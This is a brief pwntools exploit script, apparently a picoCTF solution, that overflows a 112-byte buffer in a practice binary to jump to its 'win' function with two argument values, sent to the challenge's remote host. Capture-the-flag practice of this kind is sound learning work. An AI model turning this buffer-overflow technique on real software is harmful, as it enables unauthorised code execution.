from pwn import *

context.binary = elf = ELF('./vuln')

#io = process('./vuln')
#io = gdb.debug('./vuln')
io = remote("saturn.picoctf.net", 52029)

padding = b"A"*112

payload = padding + flat(elf.sym['win'], elf.sym['main'], 0xCAFEF00D,0xF00DF00D)

io.sendlineafter(b"string:",payload, timeout=1)

io.interactive()
